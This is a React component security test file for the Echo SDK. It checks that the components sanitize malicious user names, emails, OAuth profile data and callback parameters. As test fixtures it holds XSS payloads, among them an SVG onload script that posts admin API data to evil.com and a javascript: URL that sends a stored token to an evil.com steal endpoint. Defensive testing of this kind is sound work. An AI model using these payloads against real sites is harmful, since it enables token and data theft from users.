/**
 * React Component Security Tests for Echo React SDK
 *
 * SECURITY TESTING DOCUMENTATION:
 *
 * These tests verify that React components properly implement client-side
 * security protections and don't introduce vulnerabilities through unsafe
 * rendering or API usage patterns.
 *
 * COMPONENT SECURITY CONCERNS:
 * 1. XSS through unsafe user data rendering
 * 2. API abuse through unthrottled user actions
 * 3. CSP violations through popup usage
 * 4. State injection through malicious OAuth callbacks
 *
 * WHY COMPONENT-LEVEL TESTING IS CRITICAL:
 * - Security utilities are only effective if components use them correctly
 * - DOM rendering can introduce XSS even with sanitized data if used wrong
 * - User interactions can bypass client-side protections if not properly handled
 * - Component state can be manipulated through malicious props/context
 */

import React from 'react';
import { screen, waitFor, act } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, test, expect, vi, beforeEach } from 'vitest';
import { EchoSignIn } from '../../components/EchoSignIn';
import { EchoTokenPurchase } from '../../components/EchoTokenPurchase';
import { EchoContext } from '../../components/EchoProvider';
import {
  createMockUserManager,
  createMockAuthenticatedUser,
  renderWithEcho,
} from '../utils/test-helpers';

describe('Component Security Integration', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('EchoSignIn - XSS Protection', () => {
    /**
     * SECURITY TEST: Verifies EchoSignIn component sanitizes user data before rendering
     *
     * VULNERABILITY: Displaying user.name directly could execute injected scripts
     * PROTECTION: Component should use sanitizeText() before rendering user data
     */
    test('sanitizes malicious user names in welcome message', async () => {
      // Create mock user with XSS payload
      const maliciousUser = await createMockAuthenticatedUser({
        profile: {
          name: '<script>alert("XSS in name")</script>John Hacker',
          email: 'john@example.com',
        },
      });

      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(maliciousUser),
      });

      renderWithEcho(<EchoSignIn />, { mockUserManager });

      await waitFor(() => {
        expect(screen.getByText(/Welcome/)).toBeInTheDocument();
      });

      // Verify no script tags in DOM
      const welcomeElement = screen.getByText(/Welcome/);
      expect(welcomeElement.innerHTML).not.toContain('<script>');
      expect(welcomeElement.innerHTML).not.toContain('alert');

      // Should still show safe content
      expect(welcomeElement.textContent).toContain('John Hacker');
    });

    test('handles malicious email addresses safely', async () => {
      const maliciousUser = await createMockAuthenticatedUser({
        profile: {
          name: '',
          email: 'user@example.com<img src=x onerror="alert(\'Email XSS\')">',
        },
      });

      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(maliciousUser),
      });

      renderWithEcho(<EchoSignIn />, { mockUserManager });

      await waitFor(() => {
        expect(screen.getByText(/Welcome/)).toBeInTheDocument();
      });

      const welcomeElement = screen.getByText(/Welcome/);
      expect(welcomeElement.innerHTML).not.toContain('<img');
      expect(welcomeElement.innerHTML).not.toContain('onerror');
    });

    test('prevents XSS through props and callbacks', async () => {
      const maliciousOnSuccess = vi.fn();
      const maliciousOnError = vi.fn();

      // Test with potentially dangerous className
      const maliciousClassName =
        'safe-class"><script>alert("CSS XSS")</script><div class="';

      renderWithEcho(
        <EchoSignIn
          className={maliciousClassName}
          onSuccess={maliciousOnSuccess}
          onError={maliciousOnError}
        />
      );

      // Component should render safely even with malicious props
      const signInContainer = screen
        .getByText(/sign in|signing in/i)
        .closest('div');
      expect(signInContainer?.className).toContain('safe-class');

      // Should not execute script from className
      expect(document.querySelector('script')).toBeNull();
    });
  });

  describe('EchoTokenPurchase - CSP Compatibility & Security', () => {
    /**
     * SECURITY TEST: Verifies payment component uses CSP-compatible payment flow
     *
     * VULNERABILITY: Direct window.open() calls violate CSP policies
     * PROTECTION: Component should use openPaymentFlow() for CSP compatibility
     */
    test('uses CSP-compatible payment flow instead of direct popups', async () => {
      const authenticatedUser = await createMockAuthenticatedUser();
      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(authenticatedUser),
      });

      // Let MSW handle the API requests

      // Mock window.open to simulate CSP environment
      window.open = vi.fn().mockReturnValue(null);

      await act(async () => {
        renderWithEcho(<EchoTokenPurchase amount={100} />, { mockUserManager });
      });

      await waitFor(() => {
        expect(screen.getByText(/Purchase.*Tokens/)).toBeInTheDocument();
      });

      const purchaseButton = screen.getByText(/Purchase.*Tokens/);
      await userEvent.click(purchaseButton);

      // Should attempt to open payment flow (which will be mocked)
      await waitFor(() => {
        expect(window.open).toHaveBeenCalledWith(
          expect.stringContaining('stripe.com/payment-link/mock-100'),
          'echo-payment',
          'width=600,height=700,scrollbars=yes,resizable=yes'
        );
      });
    });

    test('rejects malicious payment URLs to prevent injection', async () => {
      const authenticatedUser = await createMockAuthenticatedUser();
      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(authenticatedUser),
      });

      // MSW will handle the API call and return a safe URL due to URL sanitization

      await act(async () => {
        renderWithEcho(<EchoTokenPurchase amount={100} />, { mockUserManager });
      });

      await waitFor(() => {
        expect(screen.getByText(/Purchase.*Tokens/)).toBeInTheDocument();
      });

      const purchaseButton = screen.getByText(/Purchase.*Tokens/);

      // Should handle malicious URL gracefully without throwing
      await expect(async () => {
        await userEvent.click(purchaseButton);
      }).not.toThrow();

      // Should not navigate to dangerous URL
      expect(window.location.href).not.toContain('javascript:');

      // No malicious scripts should be executed
      expect(document.querySelector('script')).toBeNull();
    });

    test('prevents amount manipulation attacks', async () => {
      const authenticatedUser = await createMockAuthenticatedUser();
      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(authenticatedUser),
      });

      // Test with a single malicious amount to keep test simple
      const maliciousAmount = -100;

      // MSW will handle the API call with the malicious amount

      await act(async () => {
        renderWithEcho(<EchoTokenPurchase amount={maliciousAmount} />, {
          mockUserManager,
        });
      });

      await waitFor(() => {
        expect(screen.getByText(/Purchase.*Tokens/)).toBeInTheDocument();
      });

      const purchaseButton = screen.getByText(/Purchase.*Tokens/);
      await userEvent.click(purchaseButton);

      // Should show error due to invalid amount (MSW handler validates this)
      await waitFor(() => {
        expect(screen.getByText(/invalid_amount/i)).toBeInTheDocument();
      });
    });
  });

  describe('EchoProvider - Profile Data Sanitization', () => {
    /**
     * SECURITY TEST: Verifies EchoProvider sanitizes OAuth profile data
     *
     * VULNERABILITY: Malicious OAuth providers can inject scripts in profile data
     * PROTECTION: Provider should sanitize all profile data using sanitizeUserProfile()
     */
    test('sanitizes malicious OAuth profile data on login', async () => {
      // Simulate malicious OAuth provider response
      const maliciousOAuthUser = await createMockAuthenticatedUser({
        profile: {
          sub: 'user123',
          name: "<svg onload=\"fetch('/api/admin').then(r=>r.json()).then(d=>fetch('https://evil.com', {method:'POST', body:JSON.stringify(d)}))\">Evil Admin",
          email:
            'admin@company.com"><iframe src="https://phishing.com"></iframe>',
          picture:
            'javascript:window.location="https://evil.com/steal?token="+localStorage.getItem("token")',
          given_name: '<script>document.body.innerHTML=""</script>Compromised',
        },
      });

      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(maliciousOAuthUser),
      });

      const TestComponent = () => {
        const context = React.useContext(EchoContext);
        if (!context) {
          return <div>No context</div>;
        }
        const { user } = context;
        return (
          <div>
            <div data-testid="user-name">{user?.name}</div>
            <div data-testid="user-email">{user?.email}</div>
            <div data-testid="user-picture">{user?.picture}</div>
          </div>
        );
      };

      renderWithEcho(<TestComponent />, { mockUserManager });

      await waitFor(() => {
        expect(screen.getByTestId('user-name')).toBeInTheDocument();
      });

      // Test actual DOM safety - no malicious content should be rendered
      const nameElement = screen.getByTestId('user-name');
      const emailElement = screen.getByTestId('user-email');
      const pictureElement = screen.getByTestId('user-picture');

      // Test actual DOM safety - sanitized content should be clean
      expect(nameElement.textContent).toContain('Evil Admin'); // Safe text should be preserved
      expect(nameElement.innerHTML).not.toContain('<svg');
      expect(nameElement.innerHTML).not.toContain('onload');
      expect(nameElement.innerHTML).not.toContain('script');

      expect(emailElement.textContent).toBe('admin@company.com'); // Iframe removed
      expect(emailElement.innerHTML).not.toContain('<iframe');
      expect(emailElement.innerHTML).not.toContain('phishing');

      expect(pictureElement.textContent).toBe(''); // javascript: URL rejected

      // Verify no dangerous scripts exist in the DOM
      expect(document.querySelector('svg[onload]')).toBeNull();
      expect(document.querySelector('iframe')).toBeNull();
      expect(document.querySelector('script')).toBeNull();
    });

    test('handles OAuth callback parameter injection', async () => {
      // Mock malicious OAuth callback URL with injected parameters
      const originalLocation = window.location;
      const mockUser = await createMockAuthenticatedUser();

      // Create a mock location object
      const mockLocation = {
        ...originalLocation,
        search:
          '?code=<script>alert("OAuth XSS")</script>&state=<img src=x onerror=alert("State XSS")>',
      };

      // Replace window.location with our mock
      Object.defineProperty(window, 'location', {
        value: mockLocation,
        writable: true,
        configurable: true,
      });

      const mockUserManager = createMockUserManager({
        signinRedirectCallback: vi.fn().mockResolvedValue(mockUser),
      });

      renderWithEcho(<div>Test</div>, { mockUserManager });

      // Should handle OAuth callback without executing injected scripts
      await waitFor(() => {
        expect(mockUserManager.signinRedirectCallback).toHaveBeenCalled();
      });

      // Verify no script injection occurred
      expect(document.querySelector('script')).toBeNull();

      // Restore original location
      Object.defineProperty(window, 'location', {
        value: originalLocation,
        writable: true,
        configurable: true,
      });
    });
  });
});
